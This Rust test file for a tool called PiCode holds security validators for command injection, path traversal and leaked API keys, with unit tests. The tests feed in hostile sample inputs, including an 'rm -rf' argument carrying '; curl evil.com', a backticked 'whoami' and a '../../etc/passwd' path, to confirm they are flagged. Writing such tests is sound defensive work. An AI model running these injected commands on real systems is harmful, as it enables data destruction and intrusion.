//! Security validation tests for PiCode

pub mod llm_security;
pub mod command_security;
pub mod config_security;

use super::TestContext;
use std::path::Path;

/// Security test utilities
pub struct SecurityTestRunner {
    pub context: TestContext,
}

impl SecurityTestRunner {
    pub fn new() -> picode::Result<Self> {
        Ok(Self {
            context: TestContext::new()?,
        })
    }

    /// Test for potential command injection vulnerabilities
    pub fn validate_command_safety(&self, command: &str, args: &[&str]) -> SecurityResult {
        let mut issues = Vec::new();

        // Check for shell metacharacters
        let dangerous_chars = ['|', '&', ';', '$', '`', '\n', '\r'];
        for &ch in &dangerous_chars {
            if command.contains(ch) {
                issues.push(SecurityIssue::CommandInjection(format!(
                    "Command contains dangerous character: {}",
                    ch
                )));
            }
        }

        for arg in args {
            for &ch in &dangerous_chars {
                if arg.contains(ch) {
                    issues.push(SecurityIssue::CommandInjection(format!(
                        "Argument contains dangerous character: {} in '{}'",
                        ch, arg
                    )));
                }
            }
        }

        SecurityResult { issues }
    }

    /// Test for path traversal vulnerabilities
    pub fn validate_path_safety(&self, path: &Path) -> SecurityResult {
        let mut issues = Vec::new();
        let path_str = path.to_string_lossy();

        // Check for path traversal attempts
        if path_str.contains("..") {
            issues.push(SecurityIssue::PathTraversal(
                "Path contains '..' which could lead to directory traversal".to_string()
            ));
        }

        // Check for absolute paths when relative expected
        if path.is_absolute() && !self.is_allowed_absolute_path(path) {
            issues.push(SecurityIssue::PathTraversal(
                "Unexpected absolute path".to_string()
            ));
        }

        SecurityResult { issues }
    }

    /// Test API key and sensitive data handling
    pub fn validate_secret_handling(&self, content: &str) -> SecurityResult {
        let mut issues = Vec::new();

        // Check for potential API keys in logs or output
        let api_key_patterns = [
            r"sk-[a-zA-Z0-9]{48}",  // OpenAI API key pattern
            r"[a-zA-Z0-9]{32}",     // Generic 32-char key
            r"Bearer [a-zA-Z0-9]+", // Bearer tokens
        ];

        for pattern in &api_key_patterns {
            if regex::Regex::new(pattern).unwrap().is_match(content) {
                issues.push(SecurityIssue::SecretExposure(
                    "Potential API key or secret found in content".to_string()
                ));
            }
        }

        SecurityResult { issues }
    }

    fn is_allowed_absolute_path(&self, path: &Path) -> bool {
        // Define allowed absolute paths (e.g., system directories)
        let allowed_prefixes = ["/tmp", "/usr/local", "/home"];
        let path_str = path.to_string_lossy();
        
        allowed_prefixes.iter().any(|prefix| path_str.starts_with(prefix))
    }
}

/// Security validation result
pub struct SecurityResult {
    pub issues: Vec<SecurityIssue>,
}

impl SecurityResult {
    pub fn is_safe(&self) -> bool {
        self.issues.is_empty()
    }

    pub fn assert_safe(&self) {
        if !self.is_safe() {
            let issues: Vec<String> = self.issues.iter().map(|i| i.to_string()).collect();
            panic!("Security issues found: {}", issues.join(", "));
        }
    }

    pub fn print_issues(&self) {
        for issue in &self.issues {
            println!("Security Issue: {}", issue);
        }
    }
}

/// Security issue types
#[derive(Debug, Clone)]
pub enum SecurityIssue {
    CommandInjection(String),
    PathTraversal(String),
    SecretExposure(String),
    UnauthorizedAccess(String),
    DataLeak(String),
}

impl std::fmt::Display for SecurityIssue {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SecurityIssue::CommandInjection(msg) => write!(f, "Command Injection: {}", msg),
            SecurityIssue::PathTraversal(msg) => write!(f, "Path Traversal: {}", msg),
            SecurityIssue::SecretExposure(msg) => write!(f, "Secret Exposure: {}", msg),
            SecurityIssue::UnauthorizedAccess(msg) => write!(f, "Unauthorized Access: {}", msg),
            SecurityIssue::DataLeak(msg) => write!(f, "Data Leak: {}", msg),
        }
    }
}

/// Security tests
#[cfg(test)]
mod tests {
    use super::*;
    use picode::core::*;

    #[test]
    fn test_safe_command_validation() {
        let runner = SecurityTestRunner::new().expect("Failed to create security runner");
        
        let result = runner.validate_command_safety("echo", &["hello", "world"]);
        result.assert_safe();
    }

    #[test]
    fn test_dangerous_command_detection() {
        let runner = SecurityTestRunner::new().expect("Failed to create security runner");
        
        let result = runner.validate_command_safety("rm", &["-rf", "/tmp; curl evil.com"]);
        assert!(!result.is_safe());
        
        let result = runner.validate_command_safety("echo `whoami`", &[]);
        assert!(!result.is_safe());
    }

    #[test]
    fn test_safe_path_validation() {
        let runner = SecurityTestRunner::new().expect("Failed to create security runner");
        
        let safe_path = Path::new("./config/settings.toml");
        let result = runner.validate_path_safety(safe_path);
        result.assert_safe();
    }

    #[test]
    fn test_path_traversal_detection() {
        let runner = SecurityTestRunner::new().expect("Failed to create security runner");
        
        let dangerous_path = Path::new("../../etc/passwd");
        let result = runner.validate_path_safety(dangerous_path);
        assert!(!result.is_safe());
    }

    #[test]
    fn test_secret_exposure_detection() {
        let runner = SecurityTestRunner::new().expect("Failed to create security runner");
        
        let safe_content = "This is safe log content with no secrets";
        let result = runner.validate_secret_handling(safe_content);
        result.assert_safe();

        let unsafe_content = "API Key: sk-abcdef1234567890abcdef1234567890abcdef1234567890";
        let result = runner.validate_secret_handling(unsafe_content);
        assert!(!result.is_safe());
    }

    #[test]
    fn test_command_builder_security() {
        let runner = SecurityTestRunner::new().expect("Failed to create security runner");
        
        // Test that CommandBuilder prevents injection
        let command = CommandBuilder::new("echo")
            .arg("safe argument")
            .build();
        
        let result = runner.validate_command_safety(command.program(), &["safe argument"]);
        result.assert_safe();
    }
}